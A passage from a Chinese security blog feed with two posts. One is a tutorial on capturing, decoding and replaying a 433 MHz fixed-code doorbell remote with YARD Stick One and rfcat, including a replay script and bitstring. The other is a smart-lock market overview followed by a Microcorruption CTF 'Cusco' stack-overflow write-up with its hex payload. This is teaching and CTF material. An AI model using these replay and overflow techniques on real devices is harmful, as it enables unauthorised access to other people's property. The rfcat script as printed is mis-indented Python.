class="line"># 安装依赖</span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install qt5-default libfftw3-dev cmake pkg-config</span><br><span class="line"># 手动安装 libliquid1d 和 libliquid1d-dev</span><br><span class="line">$ cd ~/Downloads</span><br><span class="line">$ wget http://mirrors.kernel.org/ubuntu/pool/universe/l/liquid-dsp/libliquid1d_1.3.1-1_amd64.deb</span><br><span class="line">$ dpkg -x libliquid1d_1.3.1-1_amd64.deb ./</span><br><span class="line"> </span><br><span class="line">$ wget http://mirrors.kernel.org/ubuntu/pool/universe/l/liquid-dsp/libliquid-dev_1.3.1-1_amd64.deb</span><br><span class="line">$ dpkg -x libliquid-dev_1.3.1-1_amd64.deb ./</span><br><span class="line"> </span><br><span class="line">$ sudo cp  usr/lib/x86_64-linux-gnu/libliquid.* /usr/lib/x86_64-linux-gnu/</span><br><span class="line">$ sudo cp -ar usr/include/liquid /usr/include/</span><br><span class="line"> </span><br><span class="line"># 安装编译工具</span><br><span class="line">sudo apt-get install build-essential git</span><br><span class="line"> </span><br><span class="line"># 克隆存储库并编译安装 inspectrum</span><br><span class="line">$ cd ~/Downloads</span><br><span class="line">$ git clone https://github.com/miek/inspectrum.git</span><br><span class="line">$ cd inspectrum</span><br><span class="line">$ mkdir build</span><br><span class="line">$ cd build</span><br><span class="line">$ cmake ..</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure><p><img src="https://pic-1302347126.cos.ap-guangzhou.myqcloud.com/image/image-20200914163916011.png" alt="image-20200914163916011"></p><h3 id="rfcat-接收测试"><a href="#rfcat-接收测试" class="headerlink" title="rfcat 接收测试"></a>rfcat 接收测试</h3><p>将 YARD Stick One 插入计算机 USB，然后连接到虚拟机上，选择<strong>虚拟机 -&gt; 可移动设备 -&gt; OpenMoko YARD Stick One -&gt; 连接(断开与主机的连接)</strong>。</p><p><img src="https://pic-1302347126.cos.ap-guangzhou.myqcloud.com/image/image-20200910155416988.png" alt="image-20200910155416988"></p><p>连接后，执行 <code>lsusb</code>命令可以查看 usb 设备</p><p><img src="https://pic-1302347126.cos.ap-guangzhou.myqcloud.com/image/image-20200910155841040.png" alt="image-20200910155841040"></p><p>运行 rfcat 进行交互式 Python Shell 进行测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo rfcat -r</span><br></pre></td></tr></table></figure><p><img src="https://pic-1302347126.cos.ap-guangzhou.myqcloud.com/image/image-20200910172118884.png" alt="image-20200910172118884"></p><p>如图，该命令行环境下有一个简单使用帮助：有一个加密狗的全局对象 d，你可以通过该对象与  YARD Stick One 设备进行交互：</p><ul><li><strong>d.setFreq(freq)</strong> ：设置我们要传输的频率，其中“ freq” 替换成频率，例如d.setFreq(433000000)</li></ul><ul><li><p><strong>d.setMdmModulation(modulation)</strong>：设置数字调制模式，例如遥控器是ASK / OOK，所以我使用d.setMdmModulation(MOD_ASK_OOK)。</p></li><li><p><strong>d.makePktFLEN(length)</strong>：使用固定的数据包长度时，可以使用它指定数据包的大小，因此，如果发送的是“\xDE\xAD\xBE\xEF”，则为d.makePktFLEN(4)。</p></li><li><p><strong>d.setMdmDRate(baud)</strong>：此函数设置波特率或一次设置多少数据，对于我的遥控器，它约为4800波特，因此我使用d.setMdmDRate(4800)</p></li><li><p><strong>d.setMaxPower()</strong>：默认情况下，带有 rfcat 固件的 CC1111EMK 以低功率发送信号。如果运行此函数，则会将功率设置为最大，这会使信号传播得更长一些。</p></li><li><p><strong>d.RFxmit(\<bytestring>)</bytestring></strong>：该函数可以正常使用字符串，但出于处理数字等问题，发送字节串要容易得多，如果发送的是0xDEADBEEF，则应该使用d.RFxmit(‘\xDE\xAD\xBE\xEF’)</p></li></ul><p>探测信号，使用 d.specan(freq)，我这个遥控的频率为 433Mhz，使用此遥控的频率（433000000）作为参数，运行后弹出一个频谱扫描仪窗口，如图，可以看到 433Mhz 在这个扫描范围内。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In [1]: d.specan(433000000)</span><br></pre></td></tr></table></figure><p><img src="https://pic-1302347126.cos.ap-guangzhou.myqcloud.com/image/image-20200914160522592.png" alt="image-20200914160522592"></p><p>按下门铃遥控后，设备成功扫描到该信号，频率为 434.257907Mhz</p><p><img src="https://pic-1302347126.cos.ap-guangzhou.myqcloud.com/image/image-20200914160628301.png" alt="image-20200914160628301"></p><p>也可以捕获信号并以数据包显示出来，依次设置参数（设置频率上面的峰值434257907hz）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In [2]: d.setFreq(434257907)</span><br><span class="line"> </span><br><span class="line">In [3]: d.setMdmModulation(MOD_ASK_OOK)</span><br><span class="line"> </span><br><span class="line">In [4]: d.setMdmDRate(4800)</span><br><span class="line"> </span><br><span class="line">In [5]: d.setMaxPower()</span><br><span class="line"> </span><br><span class="line">In [6]: d.lowball() // 这会将无线电配置为尽可能低的过滤级别，从而有可能使整个无线电噪声作为数据通过。</span><br><span class="line">In [7]: d.RFlisten() //运行 d.RFlisten() 可以持续抓取数据传输，并以 HEX 和 ASCII 格式显示它们。按 Enter 将停止此命令，使用户返回交互式 shell。</span><br><span class="line"> </span><br><span class="line">Entering RFlisten mode...  packets arriving will be displayed on the screen</span><br><span class="line">(press Enter to stop)</span><br><span class="line">...</span><br><span class="line">(1599788652.686) Received:  ffffffffffffffffdffffffffffffffffffeffffdfffffffffffffffffffffffffffffffffffffffffffffffff7ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffdfffffffff7ffffffffffff7ffffffffffbffffffffffffbfffffffff00002000000e4c3fdc7861ffbff7ffbc3ffbc3ffef0ffffe7f3e1fffbe9e2f4fffef87c00004c8002fffbe1fffdf8f87c3fffefffffbfffff7f9fffffdfe1fffffeff0fffffdfe1ff3bfd3fffffffffce36fe17fffffa3ffffffffffcfbbe0000001040000002c0840620df7602580fbdffffff1aeffffffffffeffffffffffffffffff7ffffffffffffffffffff  | ..................................................................................................................L?.xa.....?........&gt;..../O......../........................................o....................,.@b..`%................................</span><br><span class="line">(1599788656.259) Received:  fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff3edbebf7cbffffffffffffffffffdffffffffffffffffffffdffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc00000000008a21c020c28388c5efff387ffde1fff3c3fffbe1e1e1fffefa7c7c3fffefc7e0002710094fffe7c3fffefc3e1f8fffff3fffff7fffffdfe1ffffffb40325689d5ef0fff9fffdff0ff87f83fffffffdffc3fe3ff0fffffffff400000000000000003fcc3ff70e1c3ff7ff7ff387ffbc3fff7c7fff7d7e1f0ffffdfc7f0fe9ffffffbff7ffc02a281c  | ......................................................|............................................................!........8..............||?.....&apos;..O......&gt;....?............%h.^.................?..............?.?...?.......?.|..&#125;~...............*(.</span><br></pre></td></tr></table></figure><p>但通过观察数据包并没有发现什么规律，所以用接下来说的方法进行抓取。</p><h3 id="osmocom-捕获信号"><a href="#osmocom-捕获信号" class="headerlink" title="osmocom  捕获信号"></a>osmocom  捕获信号</h3><p>将 SDR ，启动 osmocom 捕获信号，<code>-f</code> 指定频率，<code>-s</code>设置采样率。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ osmocom_fft -f 43425e4 -s 8e6</span><br></pre></td></tr></table></figure><p>点击右下角进行 REC 按钮进行录制捕获，它将产生一个 <code>.cfile</code> 的信号文件。</p><p><img src="https://pic-1302347126.cos.ap-guangzhou.myqcloud.com/image/image-20200916144646758.png" alt="image-20200916144646758"></p><p>然后按下遥控，并按住 2 秒后松开，再次点击右下角 <code>stop</code> 按钮，关闭窗口后在终端下，可以看到生成的信号文件路径。</p><p><img src="https://pic-1302347126.cos.ap-guangzhou.myqcloud.com/image/image-20200916152417724.png" alt="image-20200916152417724"></p><h3 id="inspectrum-处理信号"><a href="#inspectrum-处理信号" class="headerlink" title="inspectrum 处理信号"></a>inspectrum 处理信号</h3><p>使用 inspectrum 加载信号文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ inspectrum /tmp/name-f4.342500e+08-s2.000000e+06-t20200916152347.cfile</span><br></pre></td></tr></table></figure><p>加载后，将采样率设置成之前录制使用的 <code>-s</code> 参数（本例为8e6），并调整 FFT 大小和缩放以更好地了解频谱图。通常，先缩小一点以查看我要处理的内容，在这种情况下（通常是使用基本OOK进行处理）是一个简单的重复信号。</p><p><img src="https://pic-1302347126.cos.ap-guangzhou.myqcloud.com/image/image-20200916152448998.png" alt="image-20200916152448998"></p><p>现在，通过滚轮选择放大开头的那部分，并右键  Add derived plot -&gt; Add threshold plot 添加阈值图，以更好地可视化信号。</p><p><img src="https://pic-1302347126.cos.ap-guangzhou.myqcloud.com/image/image-20200916152529356.png" alt="image-20200916152529356"></p><p>将红线对准信号的中心，下方会显示振幅图。通过调整红线两侧的白线，离红线越近，下面振幅图的峰值更接近直线。</p><p><img src="https://pic-1302347126.cos.ap-guangzhou.myqcloud.com/image/image-20200916152557309.png" alt="image-20200916152557309"></p><p>在左侧控制栏下的 Time selection 可对波形进行划分，启用 Enable cursors，这里我们以一位<strong>“内码”</strong>信号的宽度为标准。接着对Symbols数值进行递增，直至囊括一帧信号的波形区域。</p><p><img src="https://pic-1302347126.cos.ap-guangzhou.myqcloud.com/image/image-20200916153335471.png" alt="image-20200916153335471"></p><p>关于内码，可以参考 <a href="https://datasheetspdf.com/datasheet/HS1527.html" target="_blank" rel="noopener">HS1527 芯片手册</a>，HS1527码型如下：</p><p><img src="https://pic-1302347126.cos.ap-guangzhou.myqcloud.com/image/image-20200915172212602.png" alt="image-20200915172212602"></p><p>现在我们知道在 inspectrum 里面看到的信号是什么意思了，总结下：一帧信号的编码格式为<strong>“≥8位同步码 + 20位内码 + 4位数据码”</strong>。本例一共为 32 位码。</p><p><img src="https://pic-1302347126.cos.ap-guangzhou.myqcloud.com/image/image-20200916153901578.png" alt="image-20200916153901578"></p><p>选择 Extract symbols -&gt; To stdout 提取 Symbols。</p><p><img src="https://pic-1302347126.cos.ap-guangzhou.myqcloud.com/image/image-20200916153933132.png" alt="image-20200916153932370"></p><p>提取后，在终端上会显示以下内容</p><p><img src="https://pic-1302347126.cos.ap-guangzhou.myqcloud.com/image/image-20200916154002747.png" alt="image-20200916154002747"></p><p>在前面 rfcat -r 的交互命令行下将 symbol 解码成 32 位码 <code>00000000101000111010101000100010</code>，再参考上面芯片手册截图中的同步位和内码将按高低电平宽度比换算成二进制位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`10000000000000000000000000000000111010001110100010001000111011101110100011101000111010001110100010001000111010001000100011101000`</span><br></pre></td></tr></table></figure><p><img src="https://pic-1302347126.cos.ap-guangzhou.myqcloud.com/image/image-20200916162639232.png" alt="image-20200916162639232"></p><p>最后，再将二进制位转为十六进制，使用 <strong>d.RFxmit()</strong> 就可以使用 yardstickone 进行重放信号，运行以后，这时门铃会响起。</p><p><img src="https://pic-1302347126.cos.ap-guangzhou.myqcloud.com/image/image-20200916160723616.png" alt="image-20200916160723616"></p><p>整理成脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rflib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, bitstring</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">(device)</span>:</span></span><br><span class="line">    device.setMdmModulation(MOD_ASK_OOK)</span><br><span class="line">        device.setFreq(<span class="number">433920000</span>)</span><br><span class="line">        device.setMdmSyncMode(<span class="number">0x00</span>)</span><br><span class="line">        device.setMdmNumPreamble(<span class="number">0</span>)</span><br><span class="line">        device.setPktPQT(<span class="number">0</span>)</span><br><span class="line">        device.setMaxPower()</span><br><span class="line">    device.setMdmDRate(<span class="number">2450</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitstring</span><span class="params">(*symbols)</span>:</span></span><br><span class="line">    bs = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> symbols:</span><br><span class="line">            <span class="keyword">if</span> s &gt; <span class="number">0</span>:</span><br><span class="line">                bs += <span class="string">'1'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                bs += <span class="string">'0'</span></span><br><span class="line">    <span class="keyword">print</span> bs</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bits2bytes</span><span class="params">(bit_string)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bitstring.BitArray(bin=str(bit_string.strip())).tobytes()</span><br></pre></td></tr></table></figure><h3 id="rfcat-重放信号"><a href="#rfcat-重放信号" class="headerlink" title="rfcat 重放信号"></a>rfcat 重放信号</h3><p>手动换算 symbol 后，终端执行 <strong>bits2bytes()</strong> 方法，将</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10000000000000000000000000000000111010001110100010001000111011101110100011101000111010001110100010001000111010001000100011101000</span><br></pre></td></tr></table></figure><p>转换为字节，最后执行 rfcat 的 d.RFxmit() 方法，进行重放信号（循环 10 次以上），运行后门铃响起。</p><p><img src="https://pic-1302347126.cos.ap-guangzhou.myqcloud.com/image/image-20200915173032091.png" alt="image-20200915173032091"></p><h2 id="演示视频"><a href="#演示视频" class="headerlink" title="演示视频"></a>演示视频</h2><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://greatscottgadgets.com/yardstickone/" target="_blank" rel="noopener">YARD Stick One</a><br><a href="https://github.com/atlas0fd00m/rfcat" target="_blank" rel="noopener">RfCat</a><br><a href="https://github.com/miek/inspectrum" target="_blank" rel="noopener"> inspectrum</a><br><a href="https://blog.csdn.net/oYaseng/article/details/82353160" target="_blank" rel="noopener">LimeSDR 无线信号重放攻击和逆向分析 -  BG7YWL</a><br><a href="https://www.youtube.com/watch?v=1kFNMbdGb_4&amp;feature=youtu.be" target="_blank" rel="noopener">My quickest and easiest method for OOK signal decoding &amp; replication in 2016 - Gareth</a><br><a href="https://www.securitysift.com/ook-signal-decoding-replay/" target="_blank" rel="noopener">ASK/L(OOK)/Listen! – Basic Signal Decoding and Replay - Mike Czumak</a><br><a href="https://www.andrewmohawk.com/2012/09/06/hacking-fixed-key-remotes/" target="_blank" rel="noopener">HACKING FIXED KEY REMOTES  - Andrewmohawk</a><br><a href="https://datasheetspdf.com/datasheet/HS1527.html" target="_blank" rel="noopener">HS1527 Datasheet PDF</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://greatscottgadgets.com/yardstickone/&quot; target=&quot;_blank&quot; 
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="重放攻击" scheme="http://yaseng.org/tags/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/"/>
    
      <category term="YARD Stick One" scheme="http://yaseng.org/tags/YARD-Stick-One/"/>
    
  </entry>
  
  <entry>
    <title>《锁王创造营》 第四关：两会专题</title>
    <link href="http://yaseng.org/king-of-lock-4.html"/>
    <id>http://yaseng.org/king-of-lock-4.html</id>
    <published>2020-05-29T16:00:00.000Z</published>
    <updated>2020-06-17T11:25:04.437Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>“智能家居增长潜力巨大，对拉动新兴消费意义重大。”<br>“此次疫情催生了‘宅经济’，这其中，智能家居无接触式的交互方法，为疫情时代的人们带来了便捷舒适而又安全智能的生活体验。”</p><blockquote><p>第十三届全国人大代表——郑杰</p></blockquote><p>“万物互联”从一种畅想变为实际落地场景，使联网终端的设备种类变得更加多样，智能家居市场的规模也在短时间内快速膨胀，如智能门锁、智能照明、智能家电、智能中控、智能影音等。据统计，2019年中国智能家居市场出货量突破2亿大关，较上年提升33.5%，预计今年我国智能家居市场规模将达到6000亿元。</p><p>作为从外部环境进入智能家居场景的第一个“关卡”，智能门锁的发展备受瞩目。</p><h2 id="智能锁市场发展前景"><a href="#智能锁市场发展前景" class="headerlink" title="智能锁市场发展前景"></a>智能锁市场发展前景</h2><p>随着物联网各类技术的逐步进步，越来越多的智能设备出现在我们生活中，智能锁在锁具市场上所占的份额将会越来越大，甚至超过传统锁，成为主流。</p><p>2016年全球市场智能锁产业规模达到1100万套。其中日本达到150万套，韩国达到170万套，欧美市场达到250万套，中国达到350万套，其它等市场约200万套， 预计到2020年全球智能锁产业规模将达到5100 万套 。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/6/2.jpg" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/6/3.jpg" alt="img"></p><h2 id="智能锁具产品分析"><a href="#智能锁具产品分析" class="headerlink" title="智能锁具产品分析"></a>智能锁具产品分析</h2><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/6/4.jpg" alt="img"></p><p>我国的智能锁大多数采用密码、指纹、手机等多种识别方式。其中，半导体指纹识别和光学指纹识别，是目前我国智能锁行业最主流的的指纹识别技术。</p><p>随着智能锁相关技术的日益成熟和发展，人脸识别、手机开锁、虹膜开锁、物联网技术等相继诞生，我国智能锁产品的功能和应用将更加丰富多元，也将进一步促进未来智能锁与智能家居的同步发展和高度融合。</p><h2 id="智能锁市场消费因素分析"><a href="#智能锁市场消费因素分析" class="headerlink" title="智能锁市场消费因素分析"></a>智能锁市场消费因素分析</h2><p>根据消费者的考虑因素以及智能门锁行业的发展趋势，安全、便捷和适用将会成为产品主流，行业将会出现以消费者主导的消费者品牌，而不是行业品牌，这就要求相关企业要足够洞悉消费者的心理。而最受消费者在意的安全性，将会得到进一步的强化，逐渐在真正意义上彰显智能门锁是人们隐私的保护神这一角色。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/6/5.jpg" alt="img"></p><p>根据消费者购买智能门锁考虑因素的调查结果显示，86.8%的消费者最重视智能门锁的安全性，其次消费者考虑最多的便是实用性和便捷性，最后就是质量。</p><p>以上内容是对近期智能锁具发展趋势的简要分析，在后续发布的《锁王创造营》系列文章中，我们将从各个角度结合实际案例来讲锁具的安全性。上期的锁王闯关环节中，我们成功破解了第三关——“Hanoi”，现在我们来继续破解第四关：</p><h2 id="第四关：Cusco"><a href="#第四关：Cusco" class="headerlink" title="第四关：Cusco"></a>第四关：Cusco</h2><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/6/6.jpg" alt="img"></p><p>Cusco是Microcorruption第四个关，该关卡作为Hanoi的延续，让我们开始吧。</p><h3 id="Cusco"><a href="#Cusco" class="headerlink" title="Cusco"></a>Cusco</h3><p>首先我们浏览一下手册，看该版本更新了哪些内容。</p><blockquote><p>OVERVIEW</p><ul><li>We have fixed issues with passwords which may be too long.</li><li>This lock is attached the the LockIT Pro HSM-1.</li></ul><p>DETAILS</p><p>…</p><p>This is Software Revision 02. We have improved the security of thelock by  removing a conditional  flag that could  accidentally getset by passwords that were too long.</p></blockquote><p>也就是说这一关卡还是使用了HSM-1，还删除了条件标志来提高安全性，从而避免密码太长而覆盖。</p><p>查看反汇编窗口，首先<strong>main</strong>函数，跟之前Hanoi一样，这里只调用了<strong>login</strong>函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4438 &lt;main&gt;</span><br><span class="line">4438: b012 0045     call#0x4500 &lt;login&gt;</span><br></pre></td></tr></table></figure><p><strong>login</strong>函数代码如下，调用了<strong>puts</strong>、<strong>getsn</strong>、<strong>test_password_valid</strong>以及<strong>unlock_door</strong>，看起来没有什么特别之处。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">4500 &lt;login&gt;</span><br><span class="line">4500: 3150 f0ff     add#0xfff0, sp</span><br><span class="line">4504: 3f40 7c44     mov#0x447c &quot;Enter the password to continue.&quot;, r15</span><br><span class="line">4508: b012 a645     call#0x45a6 &lt;puts&gt;</span><br><span class="line">450c: 3f40 9c44     mov#0x449c &quot;Remember: passwords are between 8 and 16 characters.&quot;, r15</span><br><span class="line">4510: b012 a645     call#0x45a6 &lt;puts&gt;</span><br><span class="line">4514: 3e40 3000     mov#0x30, r14</span><br><span class="line">4518: 0f41           movsp, r15</span><br><span class="line">451a: b012 9645     call#0x4596 &lt;getsn&gt;</span><br><span class="line">451e: 0f41           movsp, r15</span><br><span class="line">4520: b012 5244     call#0x4452 &lt;test_password_valid&gt;</span><br><span class="line">4524: 0f93           tstr15</span><br><span class="line">4526: 0524           jz#0x4532 &lt;login+0x32&gt;</span><br><span class="line">4528: b012 4644     call#0x4446 &lt;unlock_door&gt;</span><br><span class="line">452c: 3f40 d144     mov#0x44d1 &quot;Access granted.&quot;, r15</span><br><span class="line">4530: 023c           jmp#0x4536 &lt;login+0x36&gt;</span><br><span class="line">4532: 3f40 e144     mov#0x44e1 &quot;That password is not correct.&quot;, r15</span><br><span class="line">4536: b012 a645     call#0x45a6 &lt;puts&gt;</span><br><span class="line">453a: 3150 1000     add#0x10, sp</span><br><span class="line">453e: 3041           ret</span><br></pre></td></tr></table></figure><p>我们从何下手呢？还记得上一关卡Hanoi时，我们知道当我们输入内容过长时，可能覆盖它后面的内存数据，所以，首先看看<strong>getsn</strong>函数接收的输入长度以及缓冲区的位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4514: 3e40 3000     mov#0x30, r14</span><br><span class="line">4518: 0f41           movsp, r15</span><br><span class="line">451a: b012 9645     call#0x4596 &lt;getsn&gt;</span><br></pre></td></tr></table></figure><p>也就是说最大可接收0x30字节的输入，以及它存放在当前栈空间中，尝试输入若干个“A”，测试一下看看它是否会覆盖什么。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/6/7.jpg" alt="img"></p><p>从内存中可以看到确实是0x30字节，但也没有什么重要的信息，继续运行。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/6/8.jpg" alt="img"></p><p>密码错误，但是我们发现控制台窗口有一个报错，地址未对齐。原因是，我们查看上面的寄存器窗口，<code>pc</code>寄存器是0x4141，这不是“A”的16进制吗，正是我们输入的密码，0x4141并未16为对齐。</p><p>当我们在反汇编窗口向上拉，overvriteen表示原本的代码被覆盖了。基于以上说明，我们输入的内容更改了<code>pc</code>寄存器，并且已经溢出了当前的栈帧外，覆盖了我们的代码。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/6/9.jpg" alt="img"></p><p>很明显，这是一个栈溢出漏洞，我们在<strong>login</strong>函数的<code>ret</code>指令处下断点，并运行到<code>ret</code>指令的地址0x453e。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/6/10.jpg" alt="img"></p><p><code>sp</code>寄存器指向的正是<strong>login</strong>的返回地址，关于<code>ret</code>指令的作用，msp430手册中说明，将当前<code>sp</code>指向的栈中的返回地址移动到<code>pc</code>寄存器，也就是相当于<code>pop</code>和 <code>jmp</code>的操作，所以可改变程序的执行流程。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/6/11.jpg" alt="img"></p><p>至于为什么会覆盖返回地址呢？首先我们查看login的栈的空间结构，如图左，栈是从高地址向低地址递进。当<strong>main</strong>函数<code>call login</code>时，首先将当前<code>pc</code>的下一条指令地址放入堆栈栈中，接着<strong>login</strong>函数第一条指令<code>add #0xfff0, sp</code>用来开辟<strong>0x10</strong>字节大小的栈空间。但是由于我们输入了<strong>0x30</strong>字节的输入，当前栈空间不足以存放这么多数据，就会向高地址溢出，覆盖返回地址以及代码。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/6/12.jpg" alt="img"></p><p>既然返回地址被我们输入的数据覆盖，那么我们就利用这一点，来达到劫持程序流程的目的。首先我们确定返回地址的偏移，返回地址在<strong>0x43fe</strong>的位置，而我们的密码在<strong>0x43ee</strong>，所以它的偏移在+<strong>0x10</strong>的位置。确定偏移后，需要填充返回地址，返回时执行我们希望执行的代码，既然我们的目的是解锁，那么不如将<strong>unlock_door</strong>解锁函数的地址0x4446作为填充。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4446 &lt;unlock_door&gt;</span><br><span class="line">4446: 3012 7f00     push#0x7f</span><br><span class="line">444a: b012 4245     call#0x4542 &lt;INT&gt;</span><br><span class="line">444e: 2153           incdsp</span><br><span class="line">4450: 3041           ret</span><br></pre></td></tr></table></figure><h3 id="解锁"><a href="#解锁" class="headerlink" title="解锁"></a>解锁</h3><p>一切准备之后，开始进行栈溢出漏洞利用，别忘了返回地址的字节序。</p><p>使用十六进制输入：414141414141414141414141414141414644。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/6/13.jpg" alt="img"></p><p>解锁成功！</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/6/14.jpg" alt="img"></p><p>以上就是本期《锁王创造营》的全部内容，对闯关以及其他问题感兴趣的小伙伴可以加一下我们的技术交流群哦！</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/6/15.jpg" alt="img"></p><p><strong>参考</strong></p><ol><li>MSP430 用户指南 <a href="http://www.ti.com.cn/cn/lit/ug/zhcu032i/zhcu032i.pdf" target="_blank" rel="noopener">http://www.ti.com.cn/cn/lit/ug/zhcu032i/zhcu032i.pdf</a> </li><li>智能锁具攻防一:初探 <a href="https://yaseng.org/intelligent-lock-attack-and-defense-1.html">https://yaseng.org/intelligent-lock-attack-and-defense-1.html</a></li><li>智能锁行业安全分析报告 <a href="https://yaseng.org/intelligent-lock-industry-safety-report.html">https://yaseng.org/intelligent-lock-industry-safety-report.html</a></li><li>物联网安全百科 <a href="https://iot-security.wiki" target="_blank" rel="noopener">https://iot-security.wiki</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;“智能家居增长潜力巨大，对拉动新兴消费意义重大。”&lt;br&gt;“此次疫情催生了‘宅经济’，这其中，智能家居无接触式的交互方法，为疫情时代的人们带
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="终端安全" scheme="http://yaseng.org/tags/%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="智能锁安全" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E9%94%81%E5%AE%89%E5%85%A8/"/>
    
      <category term="智能锁破解" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E9%94%81%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="指纹锁安全" scheme="http://yaseng.org/tags/%E6%8C%87%E7%BA%B9%E9%94%81%E5%AE%89%E5%85%A8/"/>
    
      <category term="指纹锁破解" scheme="http://yaseng.org/tags/%E6%8C%87%E7%BA%B9%E9%94%81%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="长毛锁王" scheme="http://yaseng.org/tags/%E9%95%BF%E6%AF%9B%E9%94%81%E7%8E%8B/"/>
    
